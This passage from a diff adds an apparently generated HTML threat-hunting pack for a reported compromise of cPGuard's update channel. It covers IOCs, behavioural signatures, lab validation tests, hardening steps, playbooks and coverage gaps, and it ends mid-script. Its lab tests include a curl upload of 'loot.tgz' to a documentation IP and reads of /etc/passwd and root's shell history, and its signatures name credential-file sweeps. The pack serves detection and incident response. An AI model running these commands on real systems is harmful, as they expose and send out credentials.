+        <div class="ioc-grab">
+          <div class="igh"><span class="igt">Falcon IOC Management CSV</span><span class="igc">bulk import (placeholders)</span></div>
+          <button class="btn-copy" data-label="Copy CSV" onclick="copyBlock('grab-csv',this)" style="margin:0 0 6px;">Copy CSV</button>
+<pre class="code" id="grab-csv">type,value,action,severity,expiration,description,tags
+sha256,REPLACE_WITH_SCRIPT_SHA256,detect,high,2027-05-04,cpguard-v58812-i91511.sh (no hash published by any source; fill from your own preserved copy),campaign:cPGuard-OpsShield-SupplyChain
+sha256,REPLACE_WITH_BACKDOOR_SHELL_SHA256,detect,high,2027-05-04,/var/tmp/.cpg91511_sh (no hash published by any source; fill from your own preserved copy),campaign:cPGuard-OpsShield-SupplyChain
+domain,REPLACE_WITH_LICENSING_SERVER_DOMAIN,detect,medium,2027-05-04,OPSSHIELD licensing server used as the upload point (hostname not published; legitimate for normal licensing),campaign:cPGuard-OpsShield-SupplyChain</pre>
+        </div>
+<div class="ioc-grab" data-rosetta-gen="sentinelone-indicators"><div class="igh"><span class="igt">SentinelOne IOC import</span><span class="igc">not included</span></div><p style="font-size:12px;line-height:1.5;margin:0">This pack does not ship a SentinelOne import block: the import format could not be verified against SentinelOne's own documentation. Export a sample from your console and the block can be added with confidence.</p></div>
+        <div class="ioc-grab">
+          <div class="igh"><span class="igt">Filesystem Artifacts</span><span class="igc">named by OPSSHIELD</span></div>
+          <button class="btn-copy" data-label="Copy artifacts" onclick="copyBlock('grab-artifacts',this)" style="margin:0 0 6px;">Copy artifacts</button>
+<pre class="code" id="grab-artifacts"># Filesystem artifacts named by OPSSHIELD (all detect; the corrective update deletes them, so absence proves nothing)
+cpguard-v58812-i91511.sh                 malicious script filename
+/var/tmp/.cpg91511_sh                    backdoor shell
+/var/tmp/.cpg91511                       collection directory
+/var/tmp/.cpg91511/loot.tgz              archive staged by the script
+
+# Evidence file, NOT an indicator (legitimate product log used for the exposure check)
+/opt/cpguard/logs/install_log</pre>
+        </div>
+        <div class="ioc-grab">
+          <div class="igh"><span class="igt">Behavioral Signatures</span><span class="igc">what to hunt on</span></div>
+          <button class="btn-copy" data-label="Copy signatures" onclick="copyBlock('grab-behavior',this)" style="margin:0 0 6px;">Copy signatures</button>
+<pre class="code" id="grab-behavior"># Behavioral signatures (the combination is the signal; each tool alone is legitimate)
+Process lineage        : a non-interactive shell started by the cPGuard update path running cpguard-v&lt;digits&gt;-i&lt;digits&gt;.sh
+Hidden paths           : /var/tmp/.cpg&lt;digits&gt;, /var/tmp/.cpg&lt;digits&gt;_sh (dot prefix, cpg prefix, 5 digits in the reported case)
+Credential sweep       : several commands in a row naming /etc/shadow, /etc/passwd, /root/.ssh/authorized_keys,
+                         /root/.ssh/known_hosts, /root/.my.cnf, /root/.bash_history under one parent process
+Staging                : tar or gzip building /var/tmp/.cpg91511/loot.tgz
+Upload                 : transfer to the OPSSHIELD licensing server under a compromised account (host not published)
+Install log evidence   : lines 'Successfully updated to 5.88.12' through '5.88.19' in /opt/cpguard/logs/install_log
+Not malicious (do not alert alone):
+  - cpgcli, /opt/cpguard/ and the cPGuard binaries (legitimate product files, detect context only)
+  - OPSSHIELD support-access public key in /root/.ssh/authorized_keys (added by the product's support-access feature)</pre>
+        </div>
+        <div class="ioc-grab">
+          <div class="igh"><span class="igt">Exposure and Fix Audit</span><span class="igc">version and log check</span></div>
+          <button class="btn-copy" data-label="Copy audit" onclick="copyBlock('grab-audit',this)" style="margin:0 0 6px;">Copy audit</button>
+<pre class="code" id="grab-audit"># Exposure and fix audit (run as root on each cPGuard server; read-only)
+grep 'Successfully updated' /opt/cpguard/logs/install_log
+cpgcli --version
+# Affected updates are 5.88.12 through 5.88.19 inclusive. Fixed: 5.88.25 or later.
+# A missing or incomplete log does not prove the server was unaffected (OPSSHIELD).</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section" id="s11">
+    <div class="section-hdr"><span class="snum">11</span><h2>Detection Validation Gates</h2></div>
+    <div class="section-body">
+<table>
+<tr><th>Gate</th><th>Q1 (script)</th><th>Q2 (hidden shell)</th><th>Q3 (ELF write)</th><th>Q4 (cred sweep)</th><th>Q5 (archive)</th><th>Q6 (upload)</th><th>Q7 (DNS)</th><th>Q8 (inventory)</th></tr>
+<tr><td>Telemetry ready</td><td><span class="badge b-low">Ready</span> process creation with command line (CrowdStrike: ProcessRollup2. SentinelOne: Process Creation. Defender: DeviceProcessEvents)</td><td><span class="badge b-low">Ready</span> process creation with command line (CrowdStrike: ProcessRollup2. SentinelOne: Process Creation. Defender: DeviceProcessEvents)</td><td><span class="badge b-med">Pending</span> executable written (CrowdStrike: ElfFileWritten. SentinelOne: File Creation. Defender: DeviceFileEvents); confirm the event is licensed and populated on Linux</td><td><span class="badge b-low">Ready</span> process creation with command line (CrowdStrike: ProcessRollup2. SentinelOne: Process Creation. Defender: DeviceProcessEvents)</td><td><span class="badge b-low">Ready</span> process creation with command line (CrowdStrike: ProcessRollup2. SentinelOne: Process Creation. Defender: DeviceProcessEvents)</td><td><span class="badge b-low">Ready</span> process creation with command line (CrowdStrike: ProcessRollup2. SentinelOne: Process Creation. Defender: DeviceProcessEvents)</td><td><span class="badge b-med">Pending</span> DNS lookup (CrowdStrike: DnsRequest. SentinelOne: DNS Resolved. Defender: DeviceEvents DnsQueryResponse); needs the real hostname</td><td><span class="badge b-low">Ready</span> process creation with command line (CrowdStrike: ProcessRollup2. SentinelOne: Process Creation. Defender: DeviceProcessEvents)</td></tr>
+<tr><td>Benign baseline</td><td>30 days: expect none</td><td>30 days: expect none</td><td>30 days: list hidden executables under /var/tmp; expect installers only</td><td>30 days: list parents; expect backup and audit tooling, exclude by name</td><td>30 days: expect none</td><td>30 days: expect none</td><td>Per host, prior 30 days of lookups to the licensing host for comparison</td><td>Compare with install_log results per host</td></tr>
+<tr><td>Positive-control test</td><td>Not yet run. On a lab host run <code>sh -c 'echo test cpguard-v1-i1.sh'</code> and confirm the process event</td><td>Not yet run. On a lab host run <code>sh -c 'echo test /var/tmp/.cpg1'</code></td><td>Not yet run. In a lab, copy a harmless binary to <code>/var/tmp/.cpg1_sh</code> and confirm the write event, then delete it</td><td>Not yet run. In a lab run <code>cat /etc/passwd</code> and <code>cat /root/.bash_history</code> in one script and confirm credCmds is 2</td><td>Not yet run. In a lab run <code>tar -czf /tmp/loot.tgz /etc/hostname</code></td><td>Not yet run. In a lab run <code>curl -s -o /dev/null --max-time 1 http://192.0.2.1/ -d loot.tgz</code> (documentation address)</td><td>Not yet run. Replace the placeholder with a lab hostname and resolve it</td><td>Not yet run. Run <code>cpgcli --version</code> on a lab host with cPGuard installed</td></tr>
+<tr><td>Promotion</td><td>IOA candidate (Section 9)</td><td>IOA candidate (Section 9)</td><td>Hunt only</td><td>Hunt only</td><td>IOA candidate (Section 9)</td><td>Hunt only</td><td>Hunt only</td><td>Hunt only</td></tr>
+</table>
+<p class="callout callout-info">Run every positive control in a lab, never on production. A zero result from Q1 to Q8 does not clear a host: the vendor's cleanup deletes the named files, shell builtins create no process event, and the decisive check is the install_log test in Section 7. No query has been run against a tenant yet.</p>
+    </div>
+  </div>
+
+  <div class="section" id="s12">
+    <div class="section-hdr"><span class="snum">12</span><h2>Hardening: Tiered</h2></div>
+    <div class="section-body">
+<div class="tier-blk tier-imm"><div class="tier-lbl">Immediate (this week)</div>
+<ol>
+<li><strong>Update and verify cPGuard.</strong> Run <code>cpgcli update --start</code> on every server, then <code>cpgcli --version</code> and confirm 5.88.25 or later (OPSSHIELD advisory; MITRE M1051 Update Software). Verify: <code>cpgcli --version</code>. Note that updating does not make a host that ran the script safe.</li>
+<li><strong>Rotate every exposed credential from a trusted environment.</strong> Reset root and all password-enabled local accounts, change reused passwords elsewhere, rotate database passwords, S3 keys, DigitalOcean tokens and secrets found in root's shell history, replace the SSH private keys under <code>/root/.ssh</code> and remove the old public keys from every system that trusts them (OPSSHIELD advisory; M1027 Password Policies, M1026 Privileged Account Management). Verify: <code>passwd -S root</code>, key fingerprints, and cloud provider key-age reports.</li>
+<li><strong>Restrict outbound traffic from hosting servers.</strong> Default-deny egress with an allowlist so a root process cannot upload a loot archive to an arbitrary host (M1037 Filter Network Traffic; CIS Linux Benchmark host firewall section). Caveat: a vendor licensing host that is already allowed (as here) is not blocked by this, so it limits unknown destinations only. Verify: <code>nft list ruleset</code> or <code>iptables -S</code>.</li>
+<li><strong>Review root's authorized_keys.</strong> Remove unknown keys; remove the OPSSHIELD support-access key unless you actively use support access (OPSSHIELD is shipping a removal update). Verify: <code>cat /root/.ssh/authorized_keys</code>.</li>
+</ol></div>
+<div class="tier-blk tier-near"><div class="tier-lbl">Near term (1 to 4 weeks, pilot first)</div>
+<ol start="5">
+<li><strong>Stage security-tool updates.</strong> Run updates on a canary group and hold the rest for a defined period before they apply, where the product allows deferral. &#9888; best-practice, no formal benchmark; no source says cPGuard exposes a deferral setting, so confirm in OPSSHIELD documentation. Reduces blast radius of any future poisoned update; the 12 hour detection window here is the span a hold would have to cover.</li>
+<li><strong>Audit access to credential files.</strong> auditd watches on <code>/etc/shadow</code>, <code>/root/.ssh</code>, <code>/root/.my.cnf</code> and root history, plus exec watches under <code>/var/tmp</code> (M1047 Audit; CIS Linux Benchmark auditd section). Gives a file-read record that endpoint telemetry lacks. Playbook 3. Verify: <code>auditctl -l</code>.</li>
+<li><strong>Mount /var/tmp noexec,nosuid,nodev.</strong> Stops direct execution of a binary dropped there (CIS Linux Benchmark separate /var/tmp partition and mount options; M1022). Limit: a script run as <code>sh /var/tmp/x</code> is not stopped, and some cPanel components expect to execute from temp directories, so pilot. Playbook 4. Verify: <code>findmnt /var/tmp</code>.</li>
+<li><strong>Stop leaving secrets where a script can read them.</strong> Keep passwords out of shell history (<code>HISTCONTROL=ignorespace</code>, no secrets on command lines) and use scoped, short-lived cloud credentials instead of long-lived keys in files (M1027; T1552.003). Verify: search history for key-shaped strings after rotation. &#9888; best-practice, no formal benchmark for the history control.</li>
+</ol></div>
+<div class="tier-blk tier-strat"><div class="tier-lbl">Strategic (1 to 3 months)</div>
+<ol start="9">
+<li><strong>Treat root-level security agents as supply-chain risk.</strong> Inventory every product that auto-updates as root, require vendor release signing or checksum verification where offered, and track vendor incident notices (M1016 Vulnerability Scanning for the inventory process). &#9888; best-practice, no formal benchmark.</li>
+<li><strong>Remove standing secrets from servers.</strong> Move to a secrets manager and short-lived credentials so a one-time file sweep yields nothing durable (M1026). Verify with a secret-scan of home directories.</li>
+<li><strong>Forward logs off host.</strong> Send auth, audit and product logs to central storage so evidence like install_log and logons survive cleanup (M1047). The vendor warns a missing log does not clear a host.</li>
+</ol></div>
+    </div>
+  </div>
+
+  <div class="section" id="s13">
+    <div class="section-hdr"><span class="snum">13</span><h2>Deployable Playbooks</h2></div>
+    <div class="section-body">
+<h3>Playbook 1. Triage and preserve evidence (read-only apart from the copy)</h3>
+<p><strong>Prerequisites:</strong> Root shell on the server; free space on a trusted off-host or separate volume<br><strong>Reboot required:</strong> No<br><strong>Rollback:</strong> none required: read-only; delete the evidence folder when the case closes</p>
+<pre class="code"># 1. Record version and update history
+cpgcli --version
+grep 'Successfully updated' /opt/cpguard/logs/install_log
+
+# 2. Preserve the named artifacts BEFORE the corrective update removes them
+mkdir -p /root/cpguard-evidence-20261104
+cp -a /opt/cpguard/logs/install_log /root/cpguard-evidence-20261104/ 2&gt;/dev/null
+cp -a /var/tmp/.cpg91511 /root/cpguard-evidence-20261104/ 2&gt;/dev/null
+cp -a /var/tmp/.cpg91511_sh /root/cpguard-evidence-20261104/ 2&gt;/dev/null
+sha256sum /root/cpguard-evidence-20261104/.cpg91511_sh /root/cpguard-evidence-20261104/.cpg91511/loot.tgz 2&gt;/dev/null
+# Copy the folder off the host. Do NOT execute the backdoor shell.</pre>
+<h3>Playbook 2. Update cPGuard and verify</h3>
+<p><strong>Prerequisites:</strong> Playbook 1 evidence copied off host; maintenance window agreed<br><strong>Reboot required:</strong> No<br><strong>Rollback:</strong> none required: do not downgrade. A failed update means contact OPSSHIELD Support; never roll back to an affected version</p>
+<pre class="code">cpgcli update --start
+cpgcli --version
+# Expect 5.88.25 or later.</pre>
+<h3>Playbook 3. auditd watches for credential files and /var/tmp execution</h3>
+<p><strong>Prerequisites:</strong> auditd installed and running; rules directory writable<br><strong>Reboot required:</strong> No (unless audit is set immutable with -e 2, which then needs a reboot to change)<br><strong>Rollback:</strong> Delete the rules file and reload: rm /etc/audit/rules.d/99-credfiles.rules && augenrules --load</p>
+<pre class="code">cat &gt; /etc/audit/rules.d/99-credfiles.rules &lt;&lt;'EOF'
+-w /etc/shadow -p r -k cred_read
+-w /root/.ssh -p rwa -k root_ssh
+-w /root/.my.cnf -p r -k root_mycnf
+-w /root/.bash_history -p r -k root_hist
+-a always,exit -F arch=b64 -S execve -F dir=/var/tmp -k vartmp_exec
+EOF
+augenrules --load
+auditctl -l | grep -E 'cred_read|root_ssh|vartmp_exec'
+# Note: the execve rule's dir= filter matches exec of files in that directory only on kernels that support it; verify with a test.</pre>
+<h3>Playbook 4. Mount /var/tmp noexec,nosuid,nodev</h3>
+<p><strong>Prerequisites:</strong> Pilot on a non-production host; confirm cPanel components and backups that execute from /var/tmp; fstab backed up<br><strong>Reboot required:</strong> No for the remount; the fstab entry applies at next boot<br><strong>Rollback:</strong> Restore the backup: cp /etc/fstab.pre-vartmp /etc/fstab && mount -o remount,exec,suid,dev /var/tmp</p>
+<pre class="code">cp /etc/fstab /etc/fstab.pre-vartmp
+findmnt /var/tmp
+# If /var/tmp is its own mount, add noexec,nosuid,nodev to its options in /etc/fstab, then:
+mount -o remount,noexec,nosuid,nodev /var/tmp
+findmnt /var/tmp
+# If /var/tmp is not a separate mount, a bind mount of a dedicated directory is required; test before production.</pre>
+<h3>Playbook 5. Credential rotation checklist (run from a trusted device or recovery environment)</h3>
+<p><strong>Prerequisites:</strong> Out-of-band console access; a plan for dependent services; cloud console access<br><strong>Reboot required:</strong> No<br><strong>Rollback:</strong> Lockout recovery only: use console access to reset the password again. Do not restore old credentials, they are compromised</p>
+<pre class="code"># Per OPSSHIELD: from a trusted environment
+passwd root
+# repeat for every password-enabled local account (list them):
+awk -F: '($2 !~ /^[!*]/) {print $1}' /etc/shadow
+# SSH: generate replacement keys on a trusted machine, deploy the new public key, then remove the old key lines
+ssh-keygen -t ed25519 -f ./replacement_key
+# Rotate: MariaDB/MySQL passwords (and sync cPanel's stored copy through its supported tool),
+#         S3 access keys, DigitalOcean tokens, and any secret seen in root's shell history.</pre>
+    </div>
+  </div>
+
+  <div class="section" id="s14">
+    <div class="section-hdr"><span class="snum">14</span><h2>Containment Runbook</h2></div>
+    <div class="section-body">
+<table>
+<tr><th>Phase</th><th>Actions</th><th>Owner</th><th>Evidence</th></tr>
+<tr><td>Isolate</td><td>Scope first: servers whose install_log shows an update from 5.88.12 to 5.88.19, plus servers with a missing or incomplete log. Isolate any server with the named hidden paths, a credential-sweep hit (Q4) or an upload hit (Q6). A server that only installed the update and shows none of these can usually stay online while you update and rotate credentials.</td><td>SOC</td><td>Host list with install_log output and isolation timestamps</td></tr>
+<tr><td>Preserve</td><td>Playbook 1: keep install_log, the hidden directory, loot.tgz and the backdoor shell with hashes, copied off host. Do not run the backdoor.</td><td>IR</td><td>Evidence folder hashes</td></tr>
+<tr><td>Eradicate</td><td>Playbook 2: update to 5.88.25 or later (the vendor says this removes the known backdoor and staged files). Confirm the named paths are gone. The vendor does not recommend a routine rebuild; rebuild if you find other signs of compromise or cannot establish integrity, and ask OPSSHIELD Support for a case assessment.</td><td>Endpoint engineering</td><td>cpgcli --version output; find results</td></tr>
+<tr><td>Scope credentials</td><td>Assume the harvested set is exposed: shadow hashes, root SSH files, my.cnf secrets and anything in shell history. Review logons, database and cloud audit logs since 2026-11-02 (Section 7.4 and 7.5). Hashes are cracked offline, so weak passwords are the highest risk.</td><td>IR with identity and cloud teams</td><td>Credential inventory; audit extracts</td></tr>
+<tr><td>Recover</td><td>Playbook 5: rotate from a trusted environment, replace SSH keys, revoke sessions and tokens. Confirm no unexplained logons after rotation.</td><td>Identity / Endpoint engineering</td><td>Rotation records</td></tr>
+<tr><td>Prevent recurrence</td><td>Section 12 items 3, 5, 6, 7 and 11; add Q1, Q2 and Q5 as detect-only IOAs after the Section 11 gates pass.</td><td>Security engineering</td><td>Control verification output</td></tr>
+</table>
+    </div>
+  </div>
+
+  <div class="section" id="s15">
+    <div class="section-hdr"><span class="snum">15</span><h2>Detection Coverage Map</h2></div>
+    <div class="section-body">
+<table>
+<tr><th>Technique</th><th>Behavior</th><th>CQL</th><th>IOA</th><th data-rosetta-original="Coverage">CrowdStrike coverage</th><th class="rosetta-cov" title="How faithfully the SentinelOne query reproduces the CrowdStrike query for this row, never rated better than the CrowdStrike column. Static-reviewed, not tenant-tested.">SentinelOne</th><th class="rosetta-cov" title="How faithfully the Defender XDR query reproduces the CrowdStrike query for this row, never rated better than the CrowdStrike column. Static-reviewed, not tenant-tested.">Defender XDR</th></tr>
+<tr><td>T1195.002</td><td>Malicious script delivered via the vendor update channel</td><td>Q1, Q8</td><td>Q1</td><td><span class="badge b-med">Partial (script run seen; the delivery and installed version are outside endpoint telemetry, use install_log)</span></td><td class="rosetta-cov"><span class="badge b-med" title="This translation reproduces the CrowdStrike query, so the limit rated Partial in the CrowdStrike column applies here too. Static-reviewed, not tenant-tested. Depends on how your tenant populates the fields and event types this query reads: see the query&#x27;s known limitations and run its readiness test.">Partial: same limit as CrowdStrike</span></td><td class="rosetta-cov"><span class="badge b-med" title="This translation reproduces the CrowdStrike query, so the limit rated Partial in the CrowdStrike column applies here too. Static-reviewed, not tenant-tested. Depends on how your tenant populates the fields and event types this query reads: see the query&#x27;s known limitations and run its readiness test.">Partial: same limit as CrowdStrike</span></td></tr>
+<tr><td>T1059.004</td><td>Shell script and backdoor shell execution</td><td>Q1, Q2</td><td>Q1, Q2</td><td><span class="badge b-low">Good (if the sensor is present and the script runs as a new process)</span></td><td class="rosetta-cov"><span class="badge b-low" title="Static-reviewed, not tenant-tested. Depends on how your tenant populates the fields and event types this query reads: see the query&#x27;s known limitations and run its readiness test.">Good, with assumptions</span></td><td class="rosetta-cov"><span class="badge b-low" title="Static-reviewed, not tenant-tested. Depends on how your tenant populates the fields and event types this query reads: see the query&#x27;s known limitations and run its readiness test.">Good, with assumptions</span></td></tr>
+<tr><td>T1564.001</td><td>Hidden dotfile paths under /var/tmp</td><td>Q2, Q3</td><td>Q2</td><td><span class="badge b-med">Partial (executables and command lines; a non-executable backdoor file write is not reported)</span></td><td class="rosetta-cov"><span class="badge b-med" title="Q3: The CQL uses a Falcon executable-write event that fires only for ELF content. SentinelOne has no ELF-specific file event, so this hunts any file created in the same hidden /var/tmp locations. It is broader than the CQL and will return hidden non-executable files too.">Partial: Q3 approximate</span></td><td class="rosetta-cov"><span class="badge b-med" title="Q3: The CQL uses a Falcon executable-write event that fires only for ELF content. DeviceFileEvents has no ELF-specific action, so this hunts any file created in the same hidden /var/tmp locations. It is broader than the CQL and will return hidden non-executable files too.">Partial: Q3 approximate</span></td></tr>
+<tr><td>T1003.008</td><td>/etc/shadow and /etc/passwd collected</td><td>Q4</td><td>n/a</td><td><span class="badge b-med">Partial (command-line sweep only; builtin reads are invisible)</span></td><td class="rosetta-cov"><span class="badge b-med" title="This translation reproduces the CrowdStrike query, so the limit rated Partial in the CrowdStrike column applies here too. Static-reviewed, not tenant-tested. Depends on how your tenant populates the fields and event types this query reads: see the query&#x27;s known limitations and run its readiness test.">Partial: same limit as CrowdStrike</span></td><td class="rosetta-cov"><span class="badge b-med" title="This translation reproduces the CrowdStrike query, so the limit rated Partial in the CrowdStrike column applies here too. Static-reviewed, not tenant-tested. Depends on how your tenant populates the fields and event types this query reads: see the query&#x27;s known limitations and run its readiness test.">Partial: same limit as CrowdStrike</span></td></tr>
+<tr><td>T1552.001, T1552.003</td><td>Root my.cnf and shell history collected</td><td>Q4</td><td>n/a</td><td><span class="badge b-med">Partial (same limit as above; add the Playbook 3 audit rules)</span></td><td class="rosetta-cov"><span class="badge b-med" title="This translation reproduces the CrowdStrike query, so the limit rated Partial in the CrowdStrike column applies here too. Static-reviewed, not tenant-tested. Depends on how your tenant populates the fields and event types this query reads: see the query&#x27;s known limitations and run its readiness test.">Partial: same limit as CrowdStrike</span></td><td class="rosetta-cov"><span class="badge b-med" title="This translation reproduces the CrowdStrike query, so the limit rated Partial in the CrowdStrike column applies here too. Static-reviewed, not tenant-tested. Depends on how your tenant populates the fields and event types this query reads: see the query&#x27;s known limitations and run its readiness test.">Partial: same limit as CrowdStrike</span></td></tr>
+<tr><td>T1552.004</td><td>Root SSH authorization and known-hosts files collected</td><td>Q4</td><td>n/a</td><td><span class="badge b-med">Partial (same limit as above)</span></td><td class="rosetta-cov"><span class="badge b-med" title="This translation reproduces the CrowdStrike query, so the limit rated Partial in the CrowdStrike column applies here too. Static-reviewed, not tenant-tested. Depends on how your tenant populates the fields and event types this query reads: see the query&#x27;s known limitations and run its readiness test.">Partial: same limit as CrowdStrike</span></td><td class="rosetta-cov"><span class="badge b-med" title="This translation reproduces the CrowdStrike query, so the limit rated Partial in the CrowdStrike column applies here too. Static-reviewed, not tenant-tested. Depends on how your tenant populates the fields and event types this query reads: see the query&#x27;s known limitations and run its readiness test.">Partial: same limit as CrowdStrike</span></td></tr>
+<tr><td>T1074.001, T1560.001</td><td>Staging and archive in the hidden directory</td><td>Q5</td><td>Q5</td><td><span class="badge b-low">Good (if archived with a utility that appears on the command line)</span></td><td class="rosetta-cov"><span class="badge b-low" title="Static-reviewed, not tenant-tested. Depends on how your tenant populates the fields and event types this query reads: see the query&#x27;s known limitations and run its readiness test.">Good, with assumptions</span></td><td class="rosetta-cov"><span class="badge b-low" title="Static-reviewed, not tenant-tested. Depends on how your tenant populates the fields and event types this query reads: see the query&#x27;s known limitations and run its readiness test.">Good, with assumptions</span></td></tr>
+<tr><td>T1041</td><td>Upload to the licensing server</td><td>Q6, Q7</td><td>n/a</td><td><span class="badge b-high">GAP (method and host unpublished; Q6 tests the command line only and Q7 is an unfilled placeholder)</span></td><td class="rosetta-cov"><span class="badge b-high" title="This translation reproduces the CrowdStrike query, so the limit rated GAP in the CrowdStrike column applies here too. Q7: The CQL is an inactive placeholder: its domain filter is an unfilled token that no source publishes, so any translation would carry the same empty token and hunt nothing. It also depends on per-process DNS lookup telemetry that needs separate field verification on the tenant.">GAP: same limit as CrowdStrike</span></td><td class="rosetta-cov"><span class="badge b-high" title="This translation reproduces the CrowdStrike query, so the limit rated GAP in the CrowdStrike column applies here too. Q7: The CQL is an inactive placeholder: its domain filter is an unfilled token that no source publishes, so any translation would carry the same empty token and hunt nothing.">GAP: same limit as CrowdStrike</span></td></tr>
+<tr><td>T1078</td><td>Later use of harvested credentials</td><td>none</td><td>n/a</td><td><span class="badge b-high">GAP (outside endpoint telemetry: authentication, database and cloud audit logs)</span></td><td class="rosetta-cov"><span class="badge b-high">GAP</span></td><td class="rosetta-cov"><span class="badge b-high">GAP</span></td></tr>
+</table>
+<p><strong>Honest gaps.</strong> The vendor deletes the named files during cleanup, the upload details are not published, and file reads inside a shell leave no process event. A zero result is not clearance: run the Section 7 install_log check on every cPGuard server. Validation gates are in Section 11; no positive control has been run yet.</p>
+    </div>
+  </div>
+
+  <div class="section" id="s16">
+    <div class="section-hdr"><span class="snum">16</span><h2>Hunt Summary Ticket</h2></div>
+    <div class="section-body">
+<div class="ticket">
+<pre class="code">TITLE:      Hunt for the cPGuard update channel compromise (exposure, not confirmed compromise per host)
+SEVERITY:   High (vendor-pushed script reached servers via auto-update; credential files collected; backdoor shell left;
+            vendor estimates 32 retrieved files, BleepingComputer reports 2,946 servers affected, single-sourced)
+SCOPE:      Linux servers running cPGuard that installed an update from 5.88.12 through 5.88.19 on or after
+            2026-11-02 02:06 UTC (fixed in 5.88.25 or later)
+HYPOTHESIS: The update ran cpguard-v58812-i91511.sh, collected root credential files into /var/tmp/.cpg91511,
+            uploaded loot.tgz to the licensing server and left /var/tmp/.cpg91511_sh.
+QUERIES:    Q1-Q8 (Section 8); native checks (Section 7)
+DO FIRST:   1) grep 'Successfully updated' /opt/cpguard/logs/install_log on every cPGuard server.
+            2) Preserve the hidden artifacts (Playbook 1), then update to 5.88.25 or later (Playbook 2).
+            3) Rotate credentials from a trusted environment (Playbook 5).
+FINDINGS:   [fill in after execution]
+GAPS:       Upload host and method unpublished; named files are deleted by cleanup; shell builtin reads and later
+            credential use are outside endpoint telemetry; no hash, IP or domain published.
+ACTIONS:    Promote Q1/Q2/Q5 to detect-only Custom IOA after the Section 11 gates pass. Deploy Section 12 items 1 to 4.
+OWNER:      HuntPack
+VERSION:    v0.1 -- 2026-11-04</pre>
+</div>
+    </div>
+  </div>
+
+  <div class="section" id="s17">
+    <div class="section-hdr"><span class="snum">17</span><h2>Changelog</h2></div>
+    <div class="section-body">
+<div class="chg-entry"><span class="chg-ver">v0.1</span><span class="chg-date">2026-11-04</span><span>Initial HuntPack (draft). Built from the OPSSHIELD advisory plus three corroborating articles, all saved to the sources folder (the BleepingComputer snapshot is a model-generated extraction because direct fetch was blocked). Four sourced filesystem artifacts, three labelled placeholders, no prevent rows. Eight queries; upload and later-credential-use gaps stated in the Coverage Map. No actor, campaign or malware name is assigned by any source and none is used. SentinelOne PowerQuery and Microsoft Defender KQL tabs added to Q1-Q8: SIEM Query Rosetta release 0.1.0 (public-beta; static-reviewed translations).</span></div>
+    </div>
+  </div>
+
+  <div class="section" id="s18">
+    <div class="section-hdr"><span class="snum">18</span><h2>References</h2></div>
+    <div class="section-body">
+<table>
+<tr><th>Tier</th><th>Source</th><th>Used For</th><th>Access Date</th></tr>
+<tr><td>1</td><td><a href="https://opsshield.com/notice/cpguard-update-channel-compromise.html" target="_blank" rel="noopener">OPSSHIELD: cPGuard security advisory, update channel compromise (2026-11-03)</a></td><td>Timeline, versions, collected data, named artifacts, install_log check, remediation</td><td>2026-11-04</td></tr>
+<tr><td>2</td><td><a href="https://thehackernews.com/2026/11/cpguard-update-channel-hijacked-to.html" target="_blank" rel="noopener">The Hacker News: cPGuard Update Channel Hijacked to Backdoor Linux Servers and Collect Password Hashes (2026-11-03)</a></td><td>Corroboration, artifact descriptions, support-access key note</td><td>2026-11-04</td></tr>
+<tr><td>2</td><td><a href="https://www.bleepingcomputer.com/news/security/hackers-hijack-cpguard-autoupdate-to-deploy-backdoor-steal-data/" target="_blank" rel="noopener">BleepingComputer: Hackers hijack cPGuard autoupdate to deploy backdoor, steal data (2026-11-03)</a></td><td>Single-sourced 2,946-server figure; extraction snapshot only</td><td>2026-11-04</td></tr>
+<tr><td>2</td><td><a href="https://securityonline.info/cpguard-supply-chain-attack/" target="_blank" rel="noopener">SecurityOnline: cPGuard Supply Chain Attack Pushes Backdoor Through Update Channel</a></td><td>Corroboration of date, versions and backdoor path</td><td>2026-11-04</td></tr>
+</table>
+<p>All four sources are saved to <code>cPGuard-OpsShield-SupplyChain-Hunt-sources/</code> for provenance re-verification. MITRE mitigation and CIS Linux Benchmark references in Section 12 are cited as control families only; those pages were not fetched and no indicator or campaign claim depends on them.</p>
+    </div>
+  </div>
+
+  <div class="footer">Generated 2026-11-04 by HuntPack. Defensive content only. Indicators are perishable: re-verify against the sources in Section 18 before acting.</div>
+</div>
+
+<script>
+function toggleToc() {
+  document.body.classList.toggle('toc-collapsed');
+  if (window.matchMedia('(max-width: 768px)').matches) {
+    document.body.classList.toggle('toc-shown');
+  }
+}
+function copyQuery(id, btn) {
+  var pre = document.getElementById(id);
+  var text = pre ? pre.innerText : '';
+  navigator.clipboard.writeText(text).then(function () {
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(function () { btn.textContent = 'Copy CQL'; btn.classList.remove('copied'); }, 2000);
+  }).catch(function () {
+    var ta = document.createElement('textarea'); ta.value = text;
+    document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(function () { btn.textContent = 'Copy CQL'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+function copyBlock(id, btn) {
+  var pre = document.getElementById(id);
+  var text = pre ? pre.innerText : '';
+  var label = btn.getAttribute('data-label') || 'Copy';
+  function done() { btn.textContent = 'Copied!'; btn.classList.add('copied'); setTimeout(function () { btn.textContent = label; btn.classList.remove('copied'); }, 2000); }
+  navigator.clipboard.writeText(text).then(done).catch(function () {
+    var ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); done();
+  });
+}
+function openFalcon(id) {
+  var region = document.getElementById('cloud-region').value;
+  var pre = document.getElementById(id);
+  if (!pre || !region) return;
+  // Send the query WITH its // comments. LogScale supports '//' line comments
+  // and its own docs show a query beginning with one, so the HUNT / MITRE /
+  // CONF / FP / TUNING header travels into the search editor with the query.
+  // That header is the tuning guidance -- stripping it meant the analyst pasted
+  // a bare query into Falcon and lost the FP discriminator at the exact moment
+  // they needed it. A '|' inside a comment is safe: '//' runs to end of line,
+  // which is what makes the vendor's own '| // comment' example work.
+  var query = pre.innerText.trim();
+  var url = region + '/investigate/search?repo=all&start=7d&end=&searchViewInteractions=NoXSA&timezone=UTC&query=' + encodeURIComponent(query);
+  window.open(url, '_blank');
+}
+var sections = document.querySelectorAll('.section');
+window.addEventListener('scroll', function () {
+  var scrollY = window.scrollY + 60;
+  sections.forEach(function (sec) {
+    if (scrollY >= sec.offsetTop) {
+      document.querySelectorAll('#sidebar nav a').forEach(function (a) { a.classList.remove('active'); });
+      var link = document.querySelector('#sidebar nav a[href="#' + sec.getAttribute('id') + '"]');
